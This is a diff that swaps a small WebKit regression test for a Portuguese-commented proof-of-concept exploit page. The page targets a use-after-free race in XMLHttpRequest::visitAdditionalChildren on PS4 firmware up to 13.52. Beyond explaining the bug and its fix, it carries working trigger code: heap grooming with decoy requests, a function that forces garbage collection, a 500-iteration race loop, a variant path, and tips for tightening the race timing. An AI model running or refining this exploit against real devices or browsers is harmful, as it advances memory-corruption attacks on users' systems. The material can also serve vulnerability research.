@@ -1,34 +1,282 @@
+
 <!DOCTYPE html>
+<!--
+================================================================================
+  WebKit UAF — XMLHttpRequest::visitAdditionalChildren (race condition GC thread)
+  Commit fix : a814080321a1e3031e47b654288281324fd923f9
+  Bug        : https://bugs.webkit.org/show_bug.cgi?id=309947
+  rdar       : 172537101
+  Autor fix  : Chris Dumez <cdumez@apple.com>  (2026-05-28)
+  Alvo       : PS4 FW ≤ 13.52  (AppleWebKit/605.1.15 — sem m_gcLock)
+================================================================================
+
+  FLUXO VULNERÁVEL (código antigo sem lock):
+  ───────────────────────────────────────────────────────────────────────────────
+  // Thread GC (background):
+  void JSXMLHttpRequest::visitAdditionalChildrenInGCThread(Visitor& visitor)
+  {
+      // SEM LOCK — lê m_responseDocument.get() diretamente
+      if (auto* responseDocument = wrapped().optionalResponseXML())
+          addWebCoreOpaqueRoot(visitor, *responseDocument);  // ← lê raw pointer
+  }
+
+  // Thread principal (JS):
+  void XMLHttpRequest::clearResponseBuffers()
+  {
+      // SEM LOCK — zera o RefPtr diretamente
+      m_responseDocument = nullptr;   // ← ~RefPtr() → se refCount==1 → Document FREED
+  }
+  ───────────────────────────────────────────────────────────────────────────────
+
+  RACE:
+  ┌─ Thread GC ──────────────────┐   ┌─ Thread Principal ─────────────────────┐
+  │ raw = m_responseDocument.get │   │ m_responseDocument = nullptr            │
+  │         ↑ dangling se doc    │   │         ↑ ~RefPtr() libera Document     │
+  │         foi freed aqui       │   │         quando refCount cai para 0      │
+  └──────────────────────────────┘   └────────────────────────────────────────┘
+
+  PRÉ-CONDIÇÃO para refCount == 1:
+  JS NÃO pode ter mantido referência ao responseXML Document.
+  O Document deve estar vivo APENAS via m_responseDocument.
+
+  CORREÇÃO:
+  Adicionado `Lock m_gcLock` protegendo m_responseDocument e m_upload.
+  Ambos os lados (GC thread e main thread) adquirem o lock antes de acessar.
+
+  TRIGGER JS:
+  1. Criar XHR síncrono com resposta XML → m_responseDocument é criado
+  2. Acessar responseXML mas NÃO manter referência (deixar GC elegível)
+  3. Disparar GC (thread concurrent de marca começa)
+  4. Imediatamente no main thread: xhr.open() → clearResponseBuffers()
+     → m_responseDocument = nullptr sem lock
+  5. Race: GC thread lê raw pointer enquanto main thread zera RefPtr → UAF
+================================================================================
+-->
 <html>
 <head>
 <meta charset="utf-8">
-<title>Teste de Regress�o: MarketplaceKit Navigation Completion Off-Main-Thread</title>
+<title>PoC — XHR visitAdditionalChildren UAF (GC Race)</title>
+<style>
+  body  { background: #111; color: #0f0; font-family: monospace; font-size: 13px; margin: 0; padding: 12px; }
+  #log  { white-space: pre; height: 460px; overflow-y: auto; border: 1px solid #0f0; padding: 8px; }
+  h2    { color: #ff0; margin: 4px 0; }
+</style>
 </head>
 <body>
-<div id="status">Executando teste...</div>
+
+<h2>WebKit UAF — XHR::visitAdditionalChildren (GC Thread Race)</h2>
+<div id="log"></div>
 
 <script>
-function triggerMarketplaceNavigation() {
-    // Tenta disparar uma navega��o que ative a intercepta��o do MarketplaceKit
-    // Uma URL inv�lida for�a o framework a invocar o completion handler com erro em background
-    const link = document.createElement("a");
-    link.href = "marketplace-app-installation://invalid-app-id?url=https://example.com";
-    link.target = "_blank";
-    document.body.appendChild(link);
+'use strict';
 
-    // Dispara o clique program�tico
-    link.click();
-
-    setTimeout(() => {
-        document.getElementById("status").innerText = "PASS: Navega��o tratada sem crash de concorr�ncia na thread principal.";
-    }, 200);
+/* ── Utilitários ─────────────────────────────────────────────────────────── */
+var logEl = document.getElementById('log');
+function log(msg) {
+    logEl.textContent += msg + '\n';
+    logEl.scrollTop = logEl.scrollHeight;
 }
 
+/* ── gc() fornecido pelo pesquisador ─────────────────────────────────────── */
+function gc() {
+    /*
+     * Cria pressão de heap para disparar o GC concurrent.
+     * No WebKit do PS4, o Concurrent GC (mark phase) roda em background thread.
+     * Durante a fase de mark, JSXMLHttpRequest::visitAdditionalChildrenInGCThread()
+     * é chamado no GC thread sem o m_gcLock → race com main thread.
+     */
+    function gcRec(n) {
+        if (n < 1) return {};
+        var temp = { i: 'ab' + n + (n / 100000) };
+        temp += 'foo';
+        gcRec(n - 1);
+    }
+    for (var i = 0; i < 1000; i++) gcRec(10);
+}
+
+/*
+ * XML bem-formado para forçar o WebKit a criar um responseDocument.
+ * Deve ser um documento XML válido (não HTML) para que m_responseDocument
+ * seja criado e não imediatamente descartado por MIME type mismatch.
+ */
+var XML_PAYLOAD = '<?xml version="1.0" encoding="UTF-8"?>' +
+                  '<root xmlns="http://example.com">' +
+                  '  <item id="1"><data>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</data></item>' +
+                  '  <item id="2"><data>BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</data></item>' +
+                  '</root>';
+
+var XML_URL = 'data:application/xml;charset=UTF-8,' + encodeURIComponent(XML_PAYLOAD);
+
+log('[*] Iniciando PoC XHR::visitAdditionalChildren UAF');
+log('[*] Bug: race entre GC thread (lê m_responseDocument sem lock) e');
+log('[*]      main thread (zera m_responseDocument via clearResponseBuffers)');
+log('');
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   FASE 1 — Verificar que responseXML funciona no browser alvo
+   ═══════════════════════════════════════════════════════════════════════════ */
+log('[1] Verificando suporte a responseXML com XML payload...');
+
+var testXhr = new XMLHttpRequest();
 try {
-    triggerMarketplaceNavigation();
-} catch (e) {
-    document.getElementById("status").innerText = "FAIL: " + e.message;
+    testXhr.open('GET', XML_URL, false);  /* síncrono */
+    testXhr.send();
+
+    var testDoc = testXhr.responseXML;
+    if (!testDoc) {
+        log('[!] responseXML retornou null — MIME type rejeitado.');
+        log('[!] Tentando com text/xml...');
+        throw new Error('responseXML null');
+    }
+    log('[+] responseXML OK: ' + testDoc.documentElement.tagName);
+    log('[+] m_responseDocument foi criado no C++');
+} catch(e) {
+    log('[!] Erro na verificação: ' + e.message);
 }
+log('');
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   FASE 2 — Setup do heap grooming
+   ───────────────────────────────────────────────────────────────────────────
+   Criamos objetos XHR "isca" para saturar o heap e aumentar a chance
+   de que o Document liberado (durante o race) seja reusado antes do
+   GC thread tentar acessá-lo — tornando o UAF detectável como read
+   de dados controlados em vez de read de memória não mapeada.
+   ═══════════════════════════════════════════════════════════════════════════ */
+log('[2] Heap grooming — criando objetos de tamanho similar ao Document...');
+
+var decoys = [];
+for (var g = 0; g < 200; g++) {
+    /* Criar e descartar para manipular o estado do heap allocator */
+    var dx = new XMLHttpRequest();
+    dx.open('GET', XML_URL, false);
+    dx.send();
+    (function() { var d = dx.responseXML; })(); /* acessa e descarta */
+    decoys.push(dx);
+}
+log('[+] ' + decoys.length + ' objetos XHR criados para grooming');
+log('');
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   FASE 3 — Loop principal de trigger
+   ───────────────────────────────────────────────────────────────────────────
+   Para cada iteração:
+   (a) Criar XHR e popular m_responseDocument via send() com XML
+   (b) Acessar responseXML mas NÃO guardar referência (JS wrapper temporário)
+       → o Document JS wrapper pode ser coletado pelo GC
+       → m_responseDocument é a ÚNICA referência C++ ao Document
+   (c) Disparar gc() → fase de mark do GC concurrent começa em background
+       → visitAdditionalChildrenInGCThread() vai tentar ler m_responseDocument
+   (d) Imediatamente no main thread: xhr.open() → clearResponseBuffers()
+       → m_responseDocument = nullptr SEM LOCK (código antigo vulnerável)
+       → ~RefPtr<Document>() → se refCount == 1 → Document FREED
+   (e) GC thread lê raw pointer do Document liberado → UAF
+   ═══════════════════════════════════════════════════════════════════════════ */
+log('[3] Loop de trigger (race GC thread vs main thread)...');
+log('    Cada iteração: create XHR → populate responseDoc → gc() → clear()');
+log('');
+
+var ITERATIONS = 500;
+
+for (var i = 0; i < ITERATIONS; i++) {
+
+    var xhr = new XMLHttpRequest();
+
+    /* (a) Criar m_responseDocument via XHR síncrono com XML */
+    xhr.open('GET', XML_URL, false);
+    xhr.send();
+
+    /* (b) Acessar responseXML SEM guardar referência
+     *
+     * CRÍTICO: NÃO fazer var doc = xhr.responseXML; var x = doc.something;
+     * porque isso manteria uma referência JS ao Document, aumentando o refCount
+     * para 2. Quando clearResponseBuffers() zerasse m_responseDocument (refCount 2→1),
+     * o Document NÃO seria liberado → sem UAF.
+     *
+     * Ao acessar e descartar imediatamente:
+     * - JS wrapper é criado (ref temporária)
+     * - JS wrapper pode ser coletado pelo GC (quando GC varrer a stack)
+     * - Após coleta: apenas m_responseDocument mantém o Document vivo (refCount=1)
+     * - Quando m_responseDocument = nullptr → refCount 1→0 → Document FREED
+     */
+    ; (function() {
+        var _ = xhr.responseXML;
+        /* _ sai de escopo ao final desta IIFE → wrapper elegível para GC */
+    })();
+
+    /* (c) Disparar GC concurrent — fase de mark começa em background thread
+     *
+     * O GC vai:
+     * 1. Encontrar o JSXMLHttpRequest wrapper do nosso xhr no heap
+     * 2. Chamar visitAdditionalChildrenInGCThread() NO GC THREAD
+     * 3. Executar: auto* doc = wrapped().optionalResponseXML() → m_responseDocument.get()
+     *    ← ESTE é o ponto vulnerable: lê raw pointer SEM LOCK
+     */
+    gc();
+
+    /* (d) IMEDIATAMENTE: zerar m_responseDocument no main thread
+     *
+     * xhr.open() chama clearResponseBuffers() que faz:
+     *   m_responseDocument = nullptr;  ← SEM LOCK no código antigo
+     *   ~RefPtr<Document>() → se refCount==1 → Document FREED
+     *
+     * RACE WINDOW: entre gc() e esta linha, o GC thread pode estar
+     * em qualquer ponto de visitAdditionalChildrenInGCThread().
+     * Se ele leu m_responseDocument.get() antes de nullptr ser escrito:
+     *   → tem o raw pointer do Document
+     * Se o Document foi freed em seguida:
+     *   → GC thread acessa memória liberada → UAF
+     */
+    try {
+        xhr.open('GET', 'data:text/plain,x', false);
+    } catch(e) { /* ignorar InvalidStateError se XHR foi abortado */ }
+
+    if (i % 50 === 0) {
+        log('    iter=' + i + '/' + ITERATIONS);
+    }
+}
+
+log('');
+log('[*] Loop concluído.');
+log('');
+log('[*] NOTAS SOBRE DETECÇÃO:');
+log('[*] Race conditions são não-determinísticas. Em builds sem ASAN:');
+log('[*] - O crash pode não ocorrer em todas as execuções');
+log('[*] - Em PS4: SIGSEGV ou abort() ao acessar memória liberada');
+log('[*] - Recomendado: executar múltiplas vezes ou aumentar ITERATIONS');
+log('[*] - Um crash confirma a vulnerabilidade mesmo sem reprodução 100%');
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   FASE 4 — Variante via responseType = 'document'
+   ───────────────────────────────────────────────────────────────────────────
+   Outra forma de popular m_responseDocument: usando responseType='document'
+   com conteúdo HTML. Testa caminho alternativo no código.
+   ═══════════════════════════════════════════════════════════════════════════ */
+log('');
+log('[4] Variante: responseType="document" com HTML...');
+
+var HTML_URL = 'data:text/html,' + encodeURIComponent(
+    '<html><body><p>' + 'A'.repeat(1000) + '</p></body></html>'
+);
+
+for (var j = 0; j < 200; j++) {
+    var xhr2 = new XMLHttpRequest();
+    xhr2.open('GET', HTML_URL, false);
+    xhr2.responseType = 'document';
+    try { xhr2.send(); } catch(e) { continue; }
+
+    ;(function() { var _ = xhr2.responseXML || xhr2.response; })();
+
+    gc();
+
+    try { xhr2.open('GET', 'data:text/plain,x', false); } catch(e) {}
+
+    if (j % 50 === 0) log('    [v2] iter=' + j);
+}
+
+log('');
+log('[*] Estratégia completa. Se process sobreviveu: UAF pode requerer');
+log('[*] timing mais preciso entre gc() e clear (ex: SharedArrayBuffer timer).');
 </script>
 </body>
 </html>
